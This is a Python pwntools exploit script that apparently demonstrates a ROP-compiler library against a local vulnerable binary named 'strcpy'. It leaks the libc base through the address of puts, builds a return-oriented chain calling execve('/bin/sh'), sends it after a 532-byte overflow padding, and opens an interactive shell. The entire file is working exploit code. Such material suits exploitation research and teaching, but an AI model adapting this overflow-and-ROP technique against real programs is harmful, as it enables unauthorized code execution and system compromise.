import sys, logging, binascii, os
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './strcpy'
libc, libc_gadgets = "libc.so", "libc.gadgets"

# Make sure we get the right libc
env = dict(os.environ)
env["LD_PRELOAD"] = env['PWD'] + "/" + libc

elf = ELF(libc)
p = process([filename], env = env)
gdb.attach(p, "set disassembly-flavor intel\nbreak *0x0804865d\n")

libc_address = int(p.readline().split(":")[1].strip(), 16) - elf.symbols["puts"]
files = [(filename, None, 0), (libc, libc_gadgets, libc_address)]
libraries = [libc]

rop = ropme.rop(files, libraries, [["execve", "/bin/sh"]], arch = archinfo.ArchX86(), log_level = logging.DEBUG, bad_bytes = "\x00")
payload = 'A'*512 + 'B'*20 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
